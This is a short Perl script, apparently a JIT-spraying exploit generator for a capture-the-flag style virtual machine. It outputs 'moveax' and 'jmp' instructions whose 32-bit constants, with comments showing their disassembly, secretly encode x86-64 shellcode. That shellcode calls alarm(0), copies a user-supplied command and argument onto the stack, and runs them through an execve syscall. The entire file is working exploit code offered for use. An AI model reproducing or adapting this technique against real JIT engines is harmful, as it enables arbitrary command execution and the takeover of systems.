#!/usr/bin/perl

sub emit_moveax {
	my $value = $_[0];
	if ($value >= 0x80000000) {
		$value -= 0x80000000;
		$value -= 0x80000000;
	}
	printf "moveax %d\n", $value;
}

sub emit_jmp {
	printf "jmp %d\n", $_[0];
}

sub emit_ret {
	print "ret\n";
}

if (@ARGV < 2) {
	die "please specify the command and the argument\n";
}

my $command = $ARGV[0] . "\0";
my $arg = $ARGV[1] . "\0";
my $clen = length($command);
my $alen = length($arg);

# 6a 25                pushq  $0x25
# 31 ff                xor    %edi,%edi
&emit_jmp(1);
&emit_moveax(0xb8b8b8b8);
&emit_moveax(0xff31256a);
# 58                   pop    %rax
# 0f 05                syscall
&emit_jmp(1);
&emit_moveax(0xb8b8b8b8);
&emit_moveax(0x90050f58);
# 48 89 e7             mov    %rsp,%rdi
&emit_jmp(1);
&emit_moveax(0xb8b8b8b8);
&emit_moveax(0x90e78948);
# 48 89 f9             mov    %rdi,%rcx
&emit_jmp(1);
&emit_moveax(0xb8b8b8b8);
&emit_moveax(0x90f98948);
for (my $i = 0; $i < $clen; $i++) {
	# c6 01 2f             movb   $0x2f,(%rcx)
	&emit_jmp(1);
	&emit_moveax(0xb8b8b8b8);
	&emit_moveax(0x900001c6 | (ord(substr($command, $i, 1)) << 16));
	# 48 83 c1 01          add    $0x1,%rcx
	&emit_jmp(1);
	&emit_moveax(0xb8b8b8b8);
	&emit_moveax(0x01c18348);
}
# 48 89 ca             mov    %rcx,%rdx
&emit_jmp(1);
&emit_moveax(0xb8b8b8b8);
&emit_moveax(0x90ca8948);
for (my $i = 0; $i < $alen; $i++) {
	# c6 01 2f             movb   $0x2f,(%rcx)
	&emit_jmp(1);
	&emit_moveax(0xb8b8b8b8);
	&emit_moveax(0x900001c6 | (ord(substr($arg, $i, 1)) << 16));
	# 48 83 c1 01          add    $0x1,%rcx
	&emit_jmp(1);
	&emit_moveax(0xb8b8b8b8);
	&emit_moveax(0x01c18348);
}
# 6a 00                pushq  $0x0
# 52                   push   %rdx
# 57                   push   %rdi
&emit_jmp(1);
&emit_moveax(0xb8b8b8b8);
&emit_moveax(0x5752006a);
# 48 89 e6             mov    %rsp,%rsi
&emit_jmp(1);
&emit_moveax(0xb8b8b8b8);
&emit_moveax(0x90e68948);
# 6a 3b                pushq  $0x3b
# 31 d2                xor    %edx,%edx
&emit_jmp(1);
&emit_moveax(0xb8b8b8b8);
&emit_moveax(0xd2313b6a);
# 58                   pop    %rax
# 0f 05                syscall
&emit_jmp(1);
&emit_moveax(0xb8b8b8b8);
&emit_moveax(0xc3050f58);
